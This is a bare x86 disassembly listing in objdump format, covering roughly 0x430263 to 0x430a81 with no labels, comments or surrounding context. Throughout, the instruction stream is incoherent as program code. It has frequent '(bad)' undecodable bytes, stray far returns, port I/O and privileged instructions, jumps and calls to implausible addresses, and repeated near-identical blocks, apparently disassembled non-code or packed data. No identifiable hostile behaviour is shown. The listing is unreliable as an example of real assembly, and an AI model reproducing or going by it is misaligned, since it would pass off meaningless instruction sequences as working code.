  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
